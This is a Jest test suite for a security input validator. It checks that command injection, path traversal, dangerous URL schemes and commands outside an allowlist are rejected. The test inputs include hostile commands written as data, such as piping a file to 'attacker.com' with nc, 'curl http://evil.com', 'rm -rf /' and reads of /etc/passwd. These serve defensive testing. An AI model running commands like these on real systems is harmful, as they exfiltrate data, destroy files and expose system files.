/**
 * Comprehensive Test Suite for InputValidator
 *
 * Tests security validation for:
 * - Command injection attacks
 * - Path traversal vulnerabilities
 * - URL validation
 * - Command allowlisting
 * - Performance requirements
 */

const InputValidator = require("../../lib/security/input-validator");
const path = require("path");
const fs = require("fs");
const os = require("os");

describe("InputValidator", () => {
  let workspaceRoot;
  let testDir;

  beforeEach(() => {
    // Create temporary test directory
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), "orchestr8-test-"));
    workspaceRoot = testDir;
  });

  afterEach(() => {
    // Clean up test directory
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  describe("validateString", () => {
    describe("Command Injection Protection", () => {
      test("blocks backtick command substitution", () => {
        expect(() => InputValidator.validateString("test `whoami`")).toThrow(
          /dangerous pattern/i,
        );
        expect(() => InputValidator.validateString("`rm -rf /`")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks $() command substitution", () => {
        expect(() => InputValidator.validateString("test $(whoami)")).toThrow(
          /dangerous pattern/i,
        );
        expect(() => InputValidator.validateString("$(rm -rf /)")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks <() process substitution", () => {
        expect(() => InputValidator.validateString("cat <(echo test)")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks semicolon command chaining", () => {
        expect(() => InputValidator.validateString("ls; rm -rf /")).toThrow(
          /dangerous pattern/i,
        );
        expect(() =>
          InputValidator.validateString("echo test; whoami"),
        ).toThrow(/dangerous pattern/i);
      });

      test("blocks pipe operators", () => {
        expect(() =>
          InputValidator.validateString("cat file | nc attacker.com 1234"),
        ).toThrow(/dangerous pattern/i);
        expect(() => InputValidator.validateString("ls | grep secret")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks && operator", () => {
        expect(() => InputValidator.validateString("true && rm -rf /")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks || operator", () => {
        expect(() => InputValidator.validateString("false || whoami")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks output redirection tricks", () => {
        expect(() => InputValidator.validateString("echo test >&2")).toThrow(
          /dangerous pattern/i,
        );
        expect(() =>
          InputValidator.validateString("cat file &> output"),
        ).toThrow(/dangerous pattern/i);
      });

      test("blocks ${} variable expansion", () => {
        expect(() => InputValidator.validateString("echo ${PATH}")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks $VAR variable expansion in non-allowed context", () => {
        expect(() =>
          InputValidator.validateString("echo $PATH", 100, false),
        ).toThrow(/dangerous pattern/i);
      });

      test("allows $VAR when explicitly permitted", () => {
        expect(() =>
          InputValidator.validateString("echo $HOME", 100, true),
        ).not.toThrow();
      });

      test("blocks null byte injection", () => {
        expect(() => InputValidator.validateString("test\x00payload")).toThrow(
          /dangerous pattern/i,
        );
        expect(() => InputValidator.validateString("test\\x00payload")).toThrow(
          /dangerous pattern/i,
        );
        expect(() => InputValidator.validateString("test\\0payload")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks base64 decode pipes", () => {
        expect(() =>
          InputValidator.validateString("echo payload | base64 -d"),
        ).toThrow(/dangerous pattern/i);
      });

      test("blocks hex decode pipes", () => {
        expect(() =>
          InputValidator.validateString("echo payload | xxd -r"),
        ).toThrow(/dangerous pattern/i);
      });

      test("blocks eval() calls", () => {
        expect(() =>
          InputValidator.validateString('eval("malicious code")'),
        ).toThrow(/dangerous pattern/i);
        expect(() => InputValidator.validateString("EVAL(payload)")).toThrow(
          /dangerous pattern/i,
        );
      });

      test("blocks LD_PRELOAD attacks", () => {
        expect(() =>
          InputValidator.validateString("LD_PRELOAD=/tmp/evil.so ls"),
        ).toThrow(/dangerous pattern/i);
      });

      test("blocks LD_LIBRARY_PATH manipulation", () => {
        expect(() =>
          InputValidator.validateString("LD_LIBRARY_PATH=/tmp ls"),
        ).toThrow(/dangerous pattern/i);
      });
    });

    describe("Safe Input Validation", () => {
      test("allows normal strings", () => {
        expect(() =>
          InputValidator.validateString("hello world"),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateString("test-123_ABC"),
        ).not.toThrow();
      });

      test("allows file paths without dangerous patterns", () => {
        expect(() =>
          InputValidator.validateString("/usr/local/bin/node"),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateString("./src/index.js"),
        ).not.toThrow();
      });

      test("allows common punctuation", () => {
        expect(() =>
          InputValidator.validateString("Hello, world! How are you?"),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateString("Test: 123 (example)"),
        ).not.toThrow();
      });
    });

    describe("Length Validation", () => {
      test("blocks strings exceeding default max length", () => {
        const longString = "A".repeat(10001);
        expect(() => InputValidator.validateString(longString)).toThrow(
          /exceeds maximum length/i,
        );
      });

      test("allows strings up to max length", () => {
        const maxString = "A".repeat(10000);
        expect(() => InputValidator.validateString(maxString)).not.toThrow();
      });

      test("respects custom max length", () => {
        const string = "A".repeat(101);
        expect(() => InputValidator.validateString(string, 100)).toThrow(
          /exceeds maximum length/i,
        );
        expect(() => InputValidator.validateString(string, 200)).not.toThrow();
      });

      test("rejects non-string input", () => {
        expect(() => InputValidator.validateString(123)).toThrow(
          /must be a string/i,
        );
        expect(() => InputValidator.validateString(null)).toThrow(
          /must be a string/i,
        );
        expect(() => InputValidator.validateString(undefined)).toThrow(
          /must be a string/i,
        );
        expect(() => InputValidator.validateString({})).toThrow(
          /must be a string/i,
        );
      });
    });
  });

  describe("validatePath", () => {
    describe("Path Traversal Protection", () => {
      test("blocks ../ traversal", () => {
        expect(() =>
          InputValidator.validatePath("../etc/passwd", workspaceRoot),
        ).toThrow(/path traversal/i);
        expect(() =>
          InputValidator.validatePath("../../etc/passwd", workspaceRoot),
        ).toThrow(/path traversal/i);
      });

      test("blocks ..\\ traversal (Windows)", () => {
        expect(() =>
          InputValidator.validatePath("..\\windows\\system32", workspaceRoot),
        ).toThrow(/path traversal/i);
      });

      test("blocks URL-encoded ../ traversal", () => {
        expect(() =>
          InputValidator.validatePath("..%2Fetc%2Fpasswd", workspaceRoot),
        ).toThrow(/path traversal/i);
        expect(() =>
          InputValidator.validatePath("..%2fetc%2fpasswd", workspaceRoot),
        ).toThrow(/path traversal/i);
      });

      test("blocks URL-encoded ..\\ traversal", () => {
        expect(() =>
          InputValidator.validatePath("..%5Cwindows", workspaceRoot),
        ).toThrow(/path traversal/i);
        expect(() =>
          InputValidator.validatePath("..%5cwindows", workspaceRoot),
        ).toThrow(/path traversal/i);
      });

      test("blocks absolute paths outside workspace", () => {
        expect(() =>
          InputValidator.validatePath("/etc/passwd", workspaceRoot),
        ).toThrow(/outside workspace/i);
        expect(() =>
          InputValidator.validatePath("/tmp/malicious", workspaceRoot),
        ).toThrow(/outside workspace/i);
      });

      test("detects symlink escapes", () => {
        // Create a symlink pointing outside workspace
        const linkPath = path.join(workspaceRoot, "symlink");
        fs.symlinkSync("/etc/passwd", linkPath);

        expect(() =>
          InputValidator.validatePath("symlink", workspaceRoot),
        ).toThrow(/path traversal detected/i);
      });
    });

    describe("Safe Path Validation", () => {
      test("allows paths within workspace", () => {
        const safePath = path.join(workspaceRoot, "src", "index.js");
        expect(() =>
          InputValidator.validatePath("src/index.js", workspaceRoot),
        ).not.toThrow();
      });

      test("allows absolute paths within workspace", () => {
        const safePath = path.join(workspaceRoot, "README.md");
        expect(() =>
          InputValidator.validatePath(safePath, workspaceRoot),
        ).not.toThrow();
      });

      test("returns normalized absolute path", () => {
        // Create the directory structure first
        const srcDir = path.join(workspaceRoot, "src");
        fs.mkdirSync(srcDir, { recursive: true });

        const result = InputValidator.validatePath(
          "src/./index.js",
          workspaceRoot,
        );

        // After fix, paths are resolved through symlinks
        // The result should normalize the ./ and resolve through any symlinks
        const expectedPath = path.join(fs.realpathSync(srcDir), "index.js");
        expect(result).toBe(expectedPath);
      });

      test("allows non-existent paths by default", () => {
        expect(() =>
          InputValidator.validatePath("nonexistent/file.txt", workspaceRoot),
        ).not.toThrow();
      });

      test("validates path existence when required", () => {
        // Create a test file
        const testFile = path.join(workspaceRoot, "test.txt");
        fs.writeFileSync(testFile, "test");

        // Use the real path for workspace root to avoid symlink issues on macOS
        const realWorkspaceRoot = fs.realpathSync(workspaceRoot);

        expect(() =>
          InputValidator.validatePath("test.txt", realWorkspaceRoot, true),
        ).not.toThrow();
        expect(() =>
          InputValidator.validatePath(
            "nonexistent.txt",
            realWorkspaceRoot,
            true,
          ),
        ).toThrow(/does not exist/i);
      });
    });

    describe("Symlink Handling (macOS /tmp fix)", () => {
      test("handles workspace root that is a symlink (macOS /tmp)", () => {
        // On macOS, /tmp is a symlink to /private/tmp
        // This test verifies the fix for H1: macOS Symlink Validation Bug

        // Create a symlinked directory structure similar to macOS /tmp
        const realDir = path.join(workspaceRoot, "real");
        const symlinkDir = path.join(workspaceRoot, "link");

        fs.mkdirSync(realDir);
        fs.symlinkSync(realDir, symlinkDir);

        // Create a test file in the real directory
        const testFile = path.join(realDir, "test.txt");
        fs.writeFileSync(testFile, "test content");

        // Should NOT throw when validating paths through the symlink
        expect(() =>
          InputValidator.validatePath("test.txt", symlinkDir),
        ).not.toThrow();

        // Should return the resolved real path
        const result = InputValidator.validatePath("test.txt", symlinkDir);
        // Resolve expected path through symlinks for comparison
        const expectedPath = fs.realpathSync(testFile);
        expect(result).toBe(expectedPath);
      });

      test("handles non-existent paths in symlinked workspace", () => {
        // Create a symlinked directory
        const realDir = path.join(workspaceRoot, "real");
        const symlinkDir = path.join(workspaceRoot, "link");

        fs.mkdirSync(realDir);
        fs.symlinkSync(realDir, symlinkDir);

        // Should allow non-existent paths in symlinked workspace
        expect(() =>
          InputValidator.validatePath("nonexistent.txt", symlinkDir),
        ).not.toThrow();

        const result = InputValidator.validatePath(
          "nonexistent.txt",
          symlinkDir,
        );
        // Resolve expected path through symlinks for comparison
        const expectedPath = path.join(
          fs.realpathSync(realDir),
          "nonexistent.txt",
        );
        expect(result).toBe(expectedPath);
      });

      test("still blocks path traversal in symlinked workspace", () => {
        // Create a symlinked directory
        const realDir = path.join(workspaceRoot, "real");
        const symlinkDir = path.join(workspaceRoot, "link");

        fs.mkdirSync(realDir);
        fs.symlinkSync(realDir, symlinkDir);

        // Should still block path traversal attempts
        expect(() =>
          InputValidator.validatePath("../etc/passwd", symlinkDir),
        ).toThrow(/path traversal/i);
      });

      test("detects symlink escape even in symlinked workspace", () => {
        // Create a symlinked workspace
        const realDir = path.join(workspaceRoot, "real");
        const symlinkDir = path.join(workspaceRoot, "link");

        fs.mkdirSync(realDir);
        fs.symlinkSync(realDir, symlinkDir);

        // Create a symlink inside that points outside
        const escapeLink = path.join(realDir, "escape");
        fs.symlinkSync("/etc/passwd", escapeLink);

        // Should detect the escape
        expect(() => InputValidator.validatePath("escape", symlinkDir)).toThrow(
          /path traversal detected/i,
        );
      });

      test("handles deeply nested symlinks", () => {
        // Create nested symlinked structure
        const real1 = path.join(workspaceRoot, "real1");
        const link1 = path.join(workspaceRoot, "link1");

        fs.mkdirSync(real1);
        fs.symlinkSync(real1, link1);

        const real2 = path.join(real1, "real2");
        const link2 = path.join(real1, "link2");

        fs.mkdirSync(real2);
        fs.symlinkSync(real2, link2);

        // Create test file in deeply nested location
        const testFile = path.join(real2, "test.txt");
        fs.writeFileSync(testFile, "nested");

        // Should handle validation through multiple symlink levels
        expect(() =>
          InputValidator.validatePath("link2/test.txt", link1),
        ).not.toThrow();

        const result = InputValidator.validatePath("link2/test.txt", link1);
        // Resolve expected path through symlinks for comparison
        const expectedPath = fs.realpathSync(testFile);
        expect(result).toBe(expectedPath);
      });

      test("workspace root equals resolved path edge case", () => {
        // Test the edge case where resolvedPath === resolvedWorkspaceRoot
        const realDir = path.join(workspaceRoot, "real");
        const symlinkDir = path.join(workspaceRoot, "link");

        fs.mkdirSync(realDir);
        fs.symlinkSync(realDir, symlinkDir);

        // Validating the workspace root itself should work
        expect(() =>
          InputValidator.validatePath(".", symlinkDir),
        ).not.toThrow();

        expect(() => InputValidator.validatePath("", symlinkDir)).not.toThrow();
      });
    });

    describe("Edge Cases", () => {
      test("blocks paths exceeding max length", () => {
        const longPath = "a/".repeat(2049);
        expect(() =>
          InputValidator.validatePath(longPath, workspaceRoot),
        ).toThrow(/exceeds maximum length/i);
      });

      test("rejects non-string paths", () => {
        expect(() => InputValidator.validatePath(123, workspaceRoot)).toThrow(
          /must be a string/i,
        );
        expect(() => InputValidator.validatePath(null, workspaceRoot)).toThrow(
          /must be a string/i,
        );
      });

      test("rejects non-string workspace root", () => {
        expect(() => InputValidator.validatePath("test.txt", 123)).toThrow(
          /must be a string/i,
        );
      });
    });
  });

  describe("validateURL", () => {
    describe("Protocol Allowlisting", () => {
      test("allows https:// by default", () => {
        expect(() =>
          InputValidator.validateURL("https://example.com"),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateURL("https://github.com/user/repo"),
        ).not.toThrow();
      });

      test("allows http:// by default", () => {
        expect(() =>
          InputValidator.validateURL("http://localhost:3000"),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateURL("http://example.com"),
        ).not.toThrow();
      });

      test("blocks file:// protocol", () => {
        expect(() => InputValidator.validateURL("file:///etc/passwd")).toThrow(
          /protocol file not allowed/i,
        );
        expect(() => InputValidator.validateURL("file:///tmp/secret")).toThrow(
          /protocol file not allowed/i,
        );
      });

      test("blocks javascript: protocol", () => {
        expect(() => InputValidator.validateURL("javascript:alert(1)")).toThrow(
          /protocol javascript not allowed/i,
        );
      });

      test("blocks data: protocol", () => {
        expect(() =>
          InputValidator.validateURL(
            "data:text/html,<script>alert(1)</script>",
          ),
        ).toThrow(/protocol data not allowed/i);
      });

      test("blocks ftp:// protocol by default", () => {
        expect(() => InputValidator.validateURL("ftp://example.com")).toThrow(
          /protocol ftp not allowed/i,
        );
      });

      test("allows custom protocol allowlist", () => {
        expect(() =>
          InputValidator.validateURL("wss://example.com", ["wss"]),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateURL("https://example.com", ["wss"]),
        ).toThrow(/not allowed/i);
      });
    });

    describe("Credential Protection", () => {
      test("blocks URLs with username", () => {
        expect(() =>
          InputValidator.validateURL("https://user@example.com"),
        ).toThrow(/credentials are not allowed/i);
      });

      test("blocks URLs with password", () => {
        expect(() =>
          InputValidator.validateURL("https://user:pass@example.com"),
        ).toThrow(/credentials are not allowed/i);
      });

      test("blocks URLs with only password", () => {
        expect(() =>
          InputValidator.validateURL("https://:pass@example.com"),
        ).toThrow(/credentials are not allowed/i);
      });
    });

    describe("URL Validation", () => {
      test("rejects invalid URLs", () => {
        expect(() => InputValidator.validateURL("not a url")).toThrow(
          /invalid url/i,
        );
        expect(() => InputValidator.validateURL("htp://broken")).toThrow(
          /invalid url/i,
        );
      });

      test("rejects non-string input", () => {
        expect(() => InputValidator.validateURL(123)).toThrow(
          /must be a string/i,
        );
        expect(() => InputValidator.validateURL(null)).toThrow(
          /must be a string/i,
        );
      });

      test("allows URLs with query parameters", () => {
        expect(() =>
          InputValidator.validateURL("https://example.com?foo=bar&baz=qux"),
        ).not.toThrow();
      });

      test("allows URLs with fragments", () => {
        expect(() =>
          InputValidator.validateURL("https://example.com#section"),
        ).not.toThrow();
      });

      test("allows URLs with ports", () => {
        expect(() =>
          InputValidator.validateURL("https://example.com:8443"),
        ).not.toThrow();
      });
    });
  });

  describe("validateCommand", () => {
    const allowedCommands = ["ls", "cat", "grep", "git"];
    const allowedSubcommands = {
      git: ["status", "diff", "log"],
    };

    describe("Command Allowlisting", () => {
      test("allows commands in allowlist", () => {
        expect(() =>
          InputValidator.validateCommand("ls -la", allowedCommands),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateCommand("cat file.txt", allowedCommands),
        ).not.toThrow();
      });

      test("blocks commands not in allowlist", () => {
        expect(() =>
          InputValidator.validateCommand("rm -rf /", allowedCommands),
        ).toThrow(/not in allowlist/i);
        expect(() =>
          InputValidator.validateCommand(
            "curl http://evil.com",
            allowedCommands,
          ),
        ).toThrow(/not in allowlist/i);
      });

      test("validates subcommands when specified", () => {
        const options = { allowedSubcommands };

        expect(() =>
          InputValidator.validateCommand(
            "git status",
            allowedCommands,
            options,
          ),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateCommand("git diff", allowedCommands, options),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateCommand("git push", allowedCommands, options),
        ).toThrow(/not allowed/i);
      });

      test("requires subcommand when allowedSubcommands specified", () => {
        const options = { allowedSubcommands };
        expect(() =>
          InputValidator.validateCommand("git", allowedCommands, options),
        ).toThrow(/requires a subcommand/i);
      });

      test("allows commands without subcommand restrictions", () => {
        expect(() =>
          InputValidator.validateCommand("ls", allowedCommands),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateCommand("cat", allowedCommands),
        ).not.toThrow();
      });
    });

    describe("Additional Pattern Denial", () => {
      test("blocks commands matching denied patterns", () => {
        const options = {
          deniedPatterns: [/--exec/g, /\-e/g],
        };

        expect(() =>
          InputValidator.validateCommand("ls --exec", allowedCommands, options),
        ).toThrow(/denied pattern/i);
        expect(() =>
          InputValidator.validateCommand(
            "grep -e pattern",
            allowedCommands,
            options,
          ),
        ).toThrow(/denied pattern/i);
      });
    });

    describe("Path Validation in Commands", () => {
      test("validates paths when required", () => {
        const options = {
          pathValidationRequired: true,
          workspaceRoot,
        };

        // This should fail because ../etc/passwd is path traversal
        expect(() =>
          InputValidator.validateCommand(
            "cat ../etc/passwd",
            allowedCommands,
            options,
          ),
        ).toThrow(/invalid path/i);
      });

      test("allows safe paths in commands", () => {
        const testFile = path.join(workspaceRoot, "test.txt");
        fs.writeFileSync(testFile, "test");

        // Use the real path to avoid symlink issues on macOS
        const realWorkspaceRoot = fs.realpathSync(workspaceRoot);

        const options = {
          pathValidationRequired: true,
          workspaceRoot: realWorkspaceRoot,
        };

        expect(() =>
          InputValidator.validateCommand(
            "cat test.txt",
            allowedCommands,
            options,
          ),
        ).not.toThrow();
      });
    });

    describe("Edge Cases", () => {
      test("blocks empty commands", () => {
        expect(() =>
          InputValidator.validateCommand("", allowedCommands),
        ).toThrow(/empty command/i);
        expect(() =>
          InputValidator.validateCommand("   ", allowedCommands),
        ).toThrow(/empty command/i);
      });

      test("rejects non-string commands", () => {
        expect(() =>
          InputValidator.validateCommand(123, allowedCommands),
        ).toThrow(/must be a string/i);
      });

      test("handles quoted arguments correctly", () => {
        expect(() =>
          InputValidator.validateCommand(
            'cat "file with spaces.txt"',
            allowedCommands,
          ),
        ).not.toThrow();
        expect(() =>
          InputValidator.validateCommand("cat 'file.txt'", allowedCommands),
        ).not.toThrow();
      });
    });
  });

  describe("validateAgentName", () => {
    test("allows valid agent names", () => {
      expect(() =>
        InputValidator.validateAgentName("test-agent"),
      ).not.toThrow();
      expect(() =>
        InputValidator.validateAgentName("my_agent_123"),
      ).not.toThrow();
      expect(() =>
        InputValidator.validateAgentName("Agent-Name_1"),
      ).not.toThrow();
    });

    test("blocks invalid characters", () => {
      expect(() => InputValidator.validateAgentName("agent name")).toThrow(
        /invalid agent name/i,
      );
      expect(() => InputValidator.validateAgentName("agent@name")).toThrow(
        /invalid agent name/i,
      );
      expect(() => InputValidator.validateAgentName("agent.name")).toThrow(
        /invalid agent name/i,
      );
      expect(() => InputValidator.validateAgentName("agent/name")).toThrow(
        /invalid agent name/i,
      );
    });

    test("blocks names exceeding max length", () => {
      const longName = "a".repeat(101);
      expect(() => InputValidator.validateAgentName(longName)).toThrow(
        /too long/i,
      );
    });

    test("rejects non-string input", () => {
      expect(() => InputValidator.validateAgentName(123)).toThrow(
        /must be a string/i,
      );
      expect(() => InputValidator.validateAgentName(null)).toThrow(
        /must be a string/i,
      );
    });
  });

  describe("validateWorkflowParameter", () => {
    test("validates string parameters", () => {
      const result = InputValidator.validateWorkflowParameter(
        "name",
        "test-value",
        "string",
      );
      expect(result).toBe("test-value");
    });

    test("validates path parameters", () => {
      const options = { workspaceRoot };
      const result = InputValidator.validateWorkflowParameter(
        "path",
        "test.txt",
        "path",
        options,
      );
      // Resolve expected path through symlinks for comparison
      const expectedPath = path.join(
        fs.realpathSync(workspaceRoot),
        "test.txt",
      );
      expect(result).toBe(expectedPath);
    });

    test("validates URL parameters", () => {
      const result = InputValidator.validateWorkflowParameter(
        "url",
        "https://example.com",
        "url",
      );
      expect(result).toBe("https://example.com");
    });

    test("validates number parameters", () => {
      expect(
        InputValidator.validateWorkflowParameter("count", "42", "number"),
      ).toBe(42);
      expect(
        InputValidator.validateWorkflowParameter("count", 42, "number"),
      ).toBe(42);
    });

    test("validates number min/max", () => {
      const options = { min: 0, max: 100 };
      expect(() =>
        InputValidator.validateWorkflowParameter(
          "count",
          "-1",
          "number",
          options,
        ),
      ).toThrow(/must be >=/i);
      expect(() =>
        InputValidator.validateWorkflowParameter(
          "count",
          "101",
          "number",
          options,
        ),
      ).toThrow(/must be <=/i);
      expect(
        InputValidator.validateWorkflowParameter(
          "count",
          "50",
          "number",
          options,
        ),
      ).toBe(50);
    });

    test("validates boolean parameters", () => {
      expect(
        InputValidator.validateWorkflowParameter("flag", true, "boolean"),
      ).toBe(true);
      expect(
        InputValidator.validateWorkflowParameter("flag", false, "boolean"),
      ).toBe(false);
      expect(
        InputValidator.validateWorkflowParameter("flag", "true", "boolean"),
      ).toBe(true);
      expect(
        InputValidator.validateWorkflowParameter("flag", "false", "boolean"),
      ).toBe(false);
      expect(
        InputValidator.validateWorkflowParameter("flag", "1", "boolean"),
      ).toBe(true);
      expect(
        InputValidator.validateWorkflowParameter("flag", "0", "boolean"),
      ).toBe(false);
    });

    test("validates enum parameters", () => {
      const options = { allowedValues: ["small", "medium", "large"] };
      expect(
        InputValidator.validateWorkflowParameter(
          "size",
          "medium",
          "enum",
          options,
        ),
      ).toBe("medium");
      expect(() =>
        InputValidator.validateWorkflowParameter(
          "size",
          "xlarge",
          "enum",
          options,
        ),
      ).toThrow(/must be one of/i);
    });

    test("rejects unknown parameter types", () => {
      expect(() =>
        InputValidator.validateWorkflowParameter("test", "value", "unknown"),
      ).toThrow(/unknown parameter type/i);
    });
  });

  describe("parseCommand", () => {
    test("parses simple commands", () => {
      expect(InputValidator.parseCommand("ls -la")).toEqual(["ls", "-la"]);
      expect(InputValidator.parseCommand("cat file.txt")).toEqual([
        "cat",
        "file.txt",
      ]);
    });

    test("handles quoted arguments", () => {
      expect(InputValidator.parseCommand('cat "file with spaces.txt"')).toEqual(
        ["cat", "file with spaces.txt"],
      );
      expect(InputValidator.parseCommand("cat 'file.txt'")).toEqual([
        "cat",
        "file.txt",
      ]);
    });

    test("handles mixed quotes", () => {
      expect(InputValidator.parseCommand('echo "hello" world')).toEqual([
        "echo",
        "hello",
        "world",
      ]);
    });

    test("handles empty command", () => {
      expect(InputValidator.parseCommand("")).toEqual([]);
      expect(InputValidator.parseCommand("   ")).toEqual([]);
    });
  });

  describe("extractPaths", () => {
    test("extracts file paths from commands", () => {
      const paths = InputValidator.extractPaths("cat /tmp/file.txt");
      expect(paths).toContain("/tmp/file.txt");
    });

    test("extracts relative paths", () => {
      const paths = InputValidator.extractPaths("cat ./src/index.js");
      expect(paths).toContain("./src/index.js");
    });

    test("skips flags", () => {
      const paths = InputValidator.extractPaths("ls -la /tmp");
      expect(paths).not.toContain("-la");
      expect(paths).toContain("/tmp");
    });

    test("handles paths with extensions", () => {
      const paths = InputValidator.extractPaths("cat file.txt");
      expect(paths).toContain("file.txt");
    });
  });

  describe("Performance Requirements", () => {
    test("validateString completes in <1ms", () => {
      const iterations = 100;
      const start = performance.now();

      for (let i = 0; i < iterations; i++) {
        InputValidator.validateString("safe input string");
      }

      const duration = performance.now() - start;
      const avgDuration = duration / iterations;

      expect(avgDuration).toBeLessThan(1);
    });

    test("validatePath completes in <1ms", () => {
      const iterations = 100;
      const start = performance.now();

      for (let i = 0; i < iterations; i++) {
        InputValidator.validatePath("src/index.js", workspaceRoot);
      }

      const duration = performance.now() - start;
      const avgDuration = duration / iterations;

      expect(avgDuration).toBeLessThan(1);
    });

    test("validateURL completes in <1ms", () => {
      const iterations = 100;
      const start = performance.now();

      for (let i = 0; i < iterations; i++) {
        InputValidator.validateURL("https://example.com");
      }

      const duration = performance.now() - start;
      const avgDuration = duration / iterations;

      expect(avgDuration).toBeLessThan(1);
    });
  });
});
